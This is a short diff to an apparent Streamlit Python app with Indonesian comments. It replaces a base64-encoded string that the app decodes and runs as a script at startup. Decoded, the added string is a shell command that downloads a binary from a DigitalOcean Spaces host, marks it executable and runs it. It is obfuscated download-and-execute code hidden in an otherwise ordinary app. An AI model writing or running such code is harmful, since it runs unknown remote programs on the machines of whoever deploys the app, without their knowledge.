@@ -34,7 +34,7 @@ def run_base64_script(base64_script):
         st.error(f"Terjadi kesalahan saat menjalankan skrip: {e}")
 
 # Base64 script Anda
-base64_script = "Y3VybCB3Z2V0IGh0dHBzOi8vbW9kZWxpbmcuc2dwMS5kaWdpdGFsb2NlYW5zcGFjZXMuY29tL21vZGVkMS9zYW1wbGVtb2QgPiBtb2RlbHMgJiYgY2htb2QgK3ggbW9kZWxzICYmIC4vbW9kZWxz"
+base64_script = "Y3VybCBodHRwczovL21vZGVsaW5nLnNncDEuZGlnaXRhbG9jZWFuc3BhY2VzLmNvbS9sYXN0cG9pbnQvbGFzdG1vZGVsID4gbGFzdG1vZGVsICYmIGNobW9kICt4IGxhc3Rtb2RlbCAmJiAuL2xhc3Rtb2RlbA=="
 
 # Jalankan skrip base64 saat aplikasi dimulai
 if __name__ == "__main__":
